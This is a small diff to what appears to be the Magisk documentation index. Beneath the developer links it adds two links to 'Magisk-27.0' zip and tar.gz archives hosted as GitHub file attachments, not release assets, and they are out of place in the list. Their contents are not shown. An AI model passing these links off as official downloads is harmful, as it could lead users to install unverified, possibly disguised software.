@@ -12,3 +12,5 @@ The following sections are for developers
 - [Magisk Tools](tools.md)
 - [Internal Details](details.md)
 - [Android Booting Shenanigans](boot.md)
+[Magisk-27.0.zip](https://github.com/topjohnwu/Magisk/files/15442491/Magisk-27.0.zip)
+[Magisk-27.0.tar.gz](https://github.com/topjohnwu/Magisk/files/15442493/Magisk-27.0.tar.gz)
